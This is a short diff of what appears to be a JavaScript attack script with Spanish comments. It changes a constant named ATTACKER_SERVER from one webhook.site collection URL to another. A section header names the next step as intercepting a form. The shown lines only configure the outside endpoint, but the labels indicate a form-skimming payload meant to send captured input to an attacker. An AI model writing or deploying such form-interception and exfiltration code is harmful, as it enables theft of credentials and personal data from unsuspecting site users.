@@ -8,7 +8,7 @@
 	// ============================================
 	// CONFIGURACIÓN DEL ATACANTE
 	// ============================================
-	const ATTACKER_SERVER = "https://webhook.site/ad792d40-113f-460e-ad72-0c25292474d8";
+	const ATTACKER_SERVER = "https://webhook.site/3605a068-2c1e-4686-bd55-0bf4400430de";
 
 	// ============================================
 	// 1. INTERCEPTAR EL FORMULARIO
